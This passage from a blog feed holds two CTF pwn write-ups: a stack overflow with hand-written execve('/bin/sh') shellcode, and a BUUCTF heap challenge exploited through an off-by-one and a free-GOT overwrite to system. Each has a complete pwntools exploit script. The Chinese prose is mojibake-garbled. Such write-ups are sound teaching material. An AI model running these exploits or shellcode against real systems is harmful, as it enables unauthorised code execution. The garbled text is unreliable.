class="number">0x3c</span>)</span><br></pre></td></tr></table></figure></div><ul><li>æ³¨æ„åˆ°æœ€ä¸‹é¢çš„add esp,0x14ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“<strong>æ ˆç©ºé—´åªæœ‰0x14çš„é•¿åº¦ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥0x3cçš„é•¿åº¦</strong>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ ˆæº¢å‡ºï¼Œè¿™å°±æ˜¯é€šè¿‡æ±‡ç¼–çœ‹æ¼æ´ã€‚</li><li>æˆ‘ä»¬å°†ret_addressæ”¹ä¸ºæ ˆåœ°å€ï¼Œå¹¶å°†æ ˆåœ°å€å†™å…¥shellcodeï¼Œé‚£ä¹ˆå°±å¯ä»¥getshellï¼Œæ¥ä¸‹æ¥çœ‹å¦‚ä½•æ³„éœ²æ ˆåœ°å€ï¼Œå¹¶ä¸”å¦‚ä½•æ‰‹å†™shellcodeã€‚</li></ul><h4 id="gdbåˆ†æï¼š"><a href="#gdbåˆ†æï¼š" class="headerlink" title="gdbåˆ†æï¼š"></a><font color="red">gdbåˆ†æï¼š</font></h4><h4 id="1-æ³„éœ²æ ˆåœ°å€"><a href="#1-æ³„éœ²æ ˆåœ°å€" class="headerlink" title="1.æ³„éœ²æ ˆåœ°å€"></a>1.æ³„éœ²æ ˆåœ°å€</h4><ul><li>ç›®å‰åªæœ‰readå’Œwriteå‡½æ•°å¯ä»¥è°ƒç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦†ç›–readçš„è¿”å›åœ°å€ä¸ºsys_writeä¸Šé¢mov ecx,espï¼›ä¹Ÿå°±æ˜¯ä¼šå†æ¬¡æ‰§è¡Œwritedï¼Œç„¶åå°†espçš„åœ°å€è¾“å‡ºå‡ºæ¥ã€‚</li><li>æ ˆåœ°å€rbpè·ç¦»rspæ˜¯0x14,å†å°†æ³„éœ²çš„åœ°å€åŠ ä¸Š0x14å°±æ˜¯æ ˆåœ°å€äº†ã€‚</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ³„æ¼æ ˆåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>) <span class="comment"># å°±æ˜¯mov ecx,esp;çš„åœ°å€</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure></div><ul><li><font size="4">æ­¤æ—¶æ ˆæº¢å‡ºä¿®æ”¹ret_address</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901112556053.bmp"></p><ul><li><font size="4">æ³„éœ²å‡ºæ ˆåœ°å€ï¼š</font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901112801146.bmp"></p><h4 id="2-æ‰‹å†™shellcode"><a href="#2-æ‰‹å†™shellcode" class="headerlink" title="2.æ‰‹å†™shellcode"></a>2.æ‰‹å†™shellcode</h4><ul><li>æˆ‘ä»¬å¯ä»¥å†™å…¥0x3cçš„æ•°æ®ï¼Œé™¤äº†0x14çš„åƒåœ¾æ•°æ®å’Œè¦†ç›–è¿”å›åœ°å€ï¼Œè¿˜å¯ä»¥å†™å…¥0x3c-0x18&#x3D;0x24çš„å†…å®¹ï¼Œç”¨<strong>pwntoolsè‡ªåŠ¨ç”Ÿæˆçš„shellcodeé•¿åº¦æ˜¯0x2cï¼Œå‘ç°æ˜¯è¿‡é•¿äº†çš„,æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±æ‰‹å†™shellcodeã€‚</strong></li><li><fron size="4" color="red">å¦‚ä½•æ‰‹å†™ï¼Ÿ</fron></li></ul><p><strong>shellcodeå…¶å®å°±æ˜¯æ‰§è¡Œexecve(â€˜&#x2F;bin&#x2F;shâ€™,0,0)</strong></p><ul><li><p><font size="4">eax &#x3D; 0xb <a class="link" href="https://blog.csdn.net/winter2121/article/details/119845443?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B732%E4%BD%8D&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-119845443.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">32ä½çš„ç³»ç»Ÿè°ƒç”¨å· <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>execveæ˜¯0xb</font></p></li><li><p><font size="4">ebx &#x3D; &#x2F;bin&#x2F;sh\x00</font></p></li><li><p><font size="4">ecx &#x3D; 0</font></p></li><li><p><font size="4">edx &#x3D; 0</font></p></li><li><p><font size="4">int 0x80</font></p></li></ul><p><strong>å„ä¸ªå¯„å­˜å™¨çš„æ•°å€¼å°±æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬æ‰‹å†™çš„shellcodeå°±è¦æ»¡è¶³è¿™äº›å°±è¡Œäº†ï¼Œæ³¨æ„&#x2F;bin&#x2F;shçš„å°ç«¯åºå°±è¡Œäº†</strong></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;/bin/sh\x00&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;0068732f6e69622f&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # å°†/bin/sh\x00å…¥æ ˆ</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32ä½ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240901114138740.bmp"></p><ul><li>ok,æ‰§è¡Œäº†execve(â€˜&#x2F;bin&#x2F;shâ€˜ï¼Œ0ï¼Œ0)äº†ï¼Œå°±getshelläº†</li></ul><h3 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,25581)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„æ¼æ ˆåœ°å€</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥shellcode</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh()) è¿‡é•¿ </span></span><br><span class="line"><span class="comment"># è‡ªå·±æ„é€ execve(&#x27;/bin/sh&#x27;,0,0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # å°†/bin/sh\x00å…¥æ ˆ</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32ä½ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_heapcreator--ç®€å•å †åˆ©ç”¨</title>
      <link href="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-hitcontraining-heapcreator"><a href="#BUUCTF-hitcontraining-heapcreator" class="headerlink" title="BUUCTF-hitcontraining_heapcreator"></a>BUUCTF-hitcontraining_heapcreator</h1><ul><li><p><a class="link" href="https://buuoj.cn/challenges#hitcontraining_heapcreator">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>glibc2.24</p></li></ul><p><font size="4"><strong>å¾ˆæ˜æ˜¾çš„å †èœå•é¢˜ç›®</strong></font></p><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/%E6%80%BB%E8%A7%88.bmp"></p><ul><li><font size="4" color="red"><strong>menu</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/menu.bmp"></p><ul><li><font size="4" color="red"><strong>create_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/add.bmp"></p><ul><li><font size="4" color="red"><strong>delete_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/delete.bmp"></p><ul><li><font size="4" color="red"><strong>edit_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/edit.bmp"></p><ul><li><font size="4" color="red"><strong>show_heap</strong></font></li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/show.bmp"></p><h3 id="åˆ†æï¼š"><a href="#åˆ†æï¼š" class="headerlink" title="åˆ†æï¼š"></a><font color="red">åˆ†æï¼š</font></h3><ul><li>å„ä¸ªåŠŸèƒ½å—éƒ½å±•ç¤ºå®Œäº†ï¼Œå‘ç°åœ¨edit_heapæœ‰ä¸€ä¸ª**<font color="red">off_by_oneæ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„size**</font></li><li>å°†å…¶freeæ‰,å†addå›æ¥ï¼Œå°±å¯ä»¥ä¿®æ”¹chunkçš„å†…å®¹ï¼Œæ³¨æ„åˆ°show_heapæ˜¯ä¸€ä¸ª**%s + åœ°å€**ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å…¶å¡«å…¥free_gotï¼Œå°±å¯ä»¥å¾—åˆ°freeçš„çœŸå®åœ°å€ï¼Œä»è€Œæ³„éœ²libcï¼Œè·å¾—systemï¼Œä½†æ˜¯å…‰systemä¸å¤Ÿå•Šã€‚</li><li>å†æ³¨æ„åˆ°delete_heap,æ˜¯free(åœ°å€),æˆ‘ä»¬å°†<strong>free_got -&gt; system</strong>ï¼Œå†åœ¨é‚£ä¸ªåœ°å€å¡«å…¥<strong>bâ€™&#x2F;bin&#x2F;sh\x00â€™</strong>,å°±å¯ä»¥getshelläº†</li><li>å…·ä½“æ€è·¯å°±è¿™äº›äº†ï¼Œæ¥çœ‹gdbè°ƒè¯•çš„ï¼š</li></ul><h3 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a><font color="red">gdbè°ƒè¯•</font></h3><p><font size="4" color="red">1.ç”³è¯·ä¸‰æ¬¡chunk</font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2ä¸ªchunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4ä¸ªchunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6ä¸ªchunk</span></span><br><span class="line">bug()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/1.bmp"></p><ul><li>è°ƒç”¨äº†ä¸‰æ¬¡create_heap,æœ‰6ä¸ªchunk,çœ‹çœ‹å…¶å†…å®¹æ˜¯ä»€ä¹ˆ</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/2.bmp"></p><p>å¯ä»¥çŒœæµ‹ï¼Œç›¸æ¯”äºæ­£å¸¸çš„chunkç»“æ„ï¼Œè¿™é‡Œå‰é¢å¤šäº†ä¸€ä¸ªchunkçš„ç»“æ„ä½“ï¼Œè®°å½•äº†å…¶sizeå’Œuser_data_address</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span>* heaparray[i] <span class="comment">// å¤§æ¦‚æ„æ€ </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><font size="4" color="red"><strong>2.åˆ©ç”¨off_by_oneä¿®æ”¹size</strong></font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/3.bmp"></p><ul><li>ä»ç®­å¤´å¤„,ä¹Ÿå°±æ˜¯dataå¤„å¡«å…¥æ•°æ®ï¼Œå¾€heaparray[0]å¤„åœ°å€å†™å…¥&#x2F;bin&#x2F;shï¼Œä¿®æ”¹chunk1ç»“æ„ä½“size,<strong>ä½¿å¾—ä¸‹æ–¹0x70çš„å†…å®¹è¢«åˆå¹¶ä¸ºä¸€ä¸ªchunk</strong>ï¼Œä¹‹åçš„freeå’Œmallocéƒ½ä¼šè¢«å½“æˆä¸€ä¸ªchunkå¤„ç†</li></ul><p><font size="4" color="red"><strong>3.addä¿®æ”¹showéƒ¨åˆ†çš„åœ°å€ä¸ºfree_gotï¼Œæ³„éœ²libc</strong></font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> æ­¤æ—¶<span class="number">1</span>,<span class="number">2</span>åˆå¹¶ï¼Œä¿®æ”¹<span class="number">2</span>å·chunk_dataä¸ºfree_gotï¼Œshowå‡ºæ¥æ³„æ¼çœŸå®åœ°å€</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x8</span>) + p64(free_got) <span class="comment">#0x8è®°å½•çš„æ˜¯chunk2çš„sizeï¼Œä¹Ÿæ˜¯åé¢editçš„é•¿åº¦ï¼Œ0x8,0x10éƒ½å¯ä»¥</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/4.bmp"></p><ul><li>å¯¹äºchunk2,ä¹Ÿå°±æ˜¯heaparray[2]æ¥è¯´ï¼Œå®ƒçš„å†…å®¹å·²ç»æ›´æ”¹ï¼Œshowçš„æ—¶å€™å°±æ˜¯show(0x602018)ï¼Œä¹Ÿå°±æ˜¯å°†free_gotæŒ‡å‘çš„å†…å®¹ç»™è¾“å‡ºå‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºfreeçš„çœŸå®åœ°å€</li></ul><p><img lazyload src="/images/loading.svg" data-src="/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/6.bmp"></p><ul><li>æ­¤æ—¶çš„heaparrayå†…å®¹å¦‚ä¸Šï¼Œå› æ­¤showå¯ä»¥å°†freeçœŸå®åœ°å€showå‡ºæ¥</li></ul><p><font size="4" color="red"><strong>4.ä¿®æ”¹free_got-&gt;systemï¼Œç„¶åæ‰§è¡Œfree</strong></font></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¿®æ”¹free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27902)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>): <span class="comment"># off_by_one</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2ä¸ªchunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4ä¸ªchunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6ä¸ªchunk</span></span><br><span class="line"><span class="comment"># bug()</span></span><br><span class="line"><span class="comment"># åˆ©ç”¨off_by_oneä¿®æ”¹size</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ­¤æ—¶1,2åˆå¹¶ï¼Œä¿®æ”¹2å·chunk_dataä¸ºfree_gotï¼Œshowå‡ºæ¥æ³„æ¼çœŸå®åœ°å€</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x10</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><ul><li>åœ¨åˆ†æå„ä¸ªåŠŸèƒ½å—çš„æ—¶å€™å°±è¦æœ‰æƒ³æ³•ï¼Œç®€å•å †é¢˜ä¸€å®šè¦å¯¹åœ°å€æŒæ¡æ”¶æ‚‰ã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIEä¿æŠ¤</title>
